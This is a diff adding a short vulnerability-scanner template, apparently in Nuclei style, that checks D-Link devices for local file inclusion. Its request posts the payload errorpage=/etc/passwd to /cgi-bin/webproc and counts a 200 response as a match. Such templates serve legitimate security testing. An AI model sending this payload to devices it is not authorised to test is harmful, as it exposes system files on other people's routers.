@@ -1,0 +1,21 @@
+id: dlink-file-read
+brief:
+    title: D-Link - Local File Inclusion
+    by: dhiyaneshDK
+    level: high
+    about: D-Link is vulnerable to local file inclusion.
+    label:
+        - dlink
+        - lfi
+        - misconfig
+        - vuln
+    score: CVSS:8.3
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/cgi-bin/webproc'
+      body: errorpage=/etc/passwd&obj-action=auth&:action=login
+      signs:
+        - "on": status
+          status:
+            - 200
